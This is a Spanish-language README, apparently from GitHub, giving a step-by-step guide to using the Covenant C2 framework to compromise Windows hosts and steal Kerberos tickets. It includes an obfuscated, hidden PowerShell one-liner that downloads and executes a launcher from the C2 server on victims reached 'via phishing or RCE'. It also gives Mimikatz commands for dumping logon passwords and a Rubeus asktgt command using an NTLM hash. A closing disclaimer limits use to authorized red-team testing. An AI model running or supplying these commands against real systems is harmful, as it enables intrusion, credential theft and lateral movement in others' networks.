# CovenTicket
Guía paso a paso para robar un *Ticket Granting Ticket (TGT)* de Kerberos usando **Covenant** como C2. Incluye:
1. **Preparación**: Instalación de Covenant en Kali Linux (requiere .NET Core).  
2. **Técnicas**:  
   - Uso de **Rubeus** (`asktgt`) para generar TGT con credenciales/NTLM hash.  
   - Extracción de tickets con **Mimikatz** (`sekurlsa::tickets`).  
3. **Propósito**:  
   - Movimiento lateral en redes Active Directory.  
   - Escalada de privilegios (*Golden Ticket*).  
4. **Contexto Ético**:  
   - Solo para pruebas de penetración *autorizadas* y entrenamiento Red Team.  
   - Técnicas asociadas a **MITRE ATT&CK T1558.001**.

![imagen](https://github.com/90l3m0np13/CovenTicket/blob/main/Covenant/Covenant.jpeg)

# 🔧 Configuración inicial

-  Cambiar credenciales predeterminadas (en la primera ejecución).

-  Crear un Listener (HTTP/HTTPS) para recibir conexiones de los Grunts.

-  Generar un Launcher (PowerShell, Binary, etc.) para infectar los sistemas objetivo.

  
## 1⚙️ Instalación de Covenant:
```bash
https://github.com/cobbr/Covenant/wiki/Installation-And-Startup
````

## 2 Ejecutar Covenant (modo desarrollo):

````bash
dotnet run
````
## 3 Acceder a la interfaz web: 
Abre un navegador y visita:
🔗 http://localhost:7443
Credenciales por defecto:
```bash
Usuario: usuario
Contraseña: password123
```

## 4 🎧 Configuración del Listener (HTTP/HTTPS)

-  Ve a Listeners > Create.

-  Selecciona HTTP (o HTTPS si tienes certificados).

- Configuración básica:

    - Name: MiListener-HTTP

    - BindAddress: 0.0.0.0 (escucha en todas las interfaces).

    - BindPort: 80 (HTTP) o 443 (HTTPS).

    - ConnectAddress: <IP_Pública_o_Dominio> (¡Obligatorio!).

- Perfiles C2: Usa uno predefinido (ej: default) o personaliza headers/user-agents.

- Guardar e Iniciar:

    - Click en Create y luego en Start.

![imagen](https://github.com/90l3m0np13/CovenTicket/blob/main/Covenant/Covenant-Listener.png)

## 2 🚀 Generación de Launchers
Objetivo: Crear payloads para ejecutar en sistemas víctimas y obtener Grunts.

### Tipos comunes y pasos:

- A. PowerShell Launcher (One-liner):
    - Ve a Launchers > PowerShell.

    - Configura:

        - Listener: MiListener-HTTP.

        - Obfuscation: Habilita Obfuscate Command (evita detección).

![imagen](https://github.com/90l3m0np13/CovenTicket/blob/main/Covenant/Covenant-Launcher_Generate.png)
    
   - Generar
        - Copia el comando resultante
        
      ```bash
      powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<C2_IP>/launcher.ps1')"
      ```
        
        - Ejecútalo en la máquina víctima (ej: via phishing o RCE).
  
![imagen](https://github.com/90l3m0np13/CovenTicket/blob/main/Covenant/Covenant-Launcher_Host.png)

  - B. Binary Launcher (EXE)

    - Ve a Launchers > Binary.

    - Configura:

        - Listener: MiListener-HTTP.

        - DotNet Version: Net40 (compatible con más sistemas).

    - Generar:

        - Descarga el .exe y ejecútalo en la víctima.

## 3 🤖  Administración de Grunts
### Objetivo: Interactuar con los sistemas comprometidos.

Pasos: 
  - Ver Grunts activos:

     - En el dashboard principal, aparecerán bajo Grunts al conectarse.

  - Interactuar con un Grunt:

    - Selecciona el Grunt > Click en Interact.
![imagen](https://github.com/90l3m0np13/CovenTicket/blob/main/Covenant/Grunt-Interact.png)

    - Usa la consola para ejecutar comandos:
     ```bash
     Shell whoami /all          # Ver información del usuario.
     Shell net user /domain     # Listar usuarios del dominio (si es AD).
     ````
Comandos útiles:

-  Comando | 	Descripción

-  Shell <cmd>	|  Ejecuta comandos del sistema.

-  Upload <local> <remoto>	| Sube archivos al Grunt.

-  Download <remoto> <local>	| Descarga archivos del Grunt.

-  Ps |	Lista procesos en ejecución.

-  Inject <PID> <shellcode> |	Inyecta código en un proceso.

-  Pivot <técnica> |	Movimiento lateral (ej: SMB, WMI).

### Módulos avanzados.
 - Mimikatz Extraer credenciales:
```bash
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
````
 - Rubeus Robar tickets Kerberos (TGT):
```bash
Execute Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_Hash> /nowrap
````
# 🚨 Solución de errores comunes
Error con ICU:

````bash
sudo apt install libicu-dev -y
export DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1
````
Problemas con .NET:
````bash
wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update && sudo apt install -y dotnet-sdk-6.0
````

## 🎯 Ejemplo de Flujo Completo
  - Listener: Creas MiListener-HTTP en el puerto 80.
  - Launcher: Generas un one-liner de PowerShell y lo ejecutas en la víctima.
  - Grunts: Interactúas con el Grunt, robas credenciales con Mimikatz y te mueves lateralmente.

## 📌 Notas clave
  - Kali + Covenant: Asegúrate de que el servidor Covenant sea accesible desde el exterior (configura NAT/port forwarding si es necesario).
  - HTTPS > HTTP: Siempre preferible para evitar sniffing.
  - Grunts muertos: Si un Grunt se cae, regenera el Launcher con el mismo perfil.


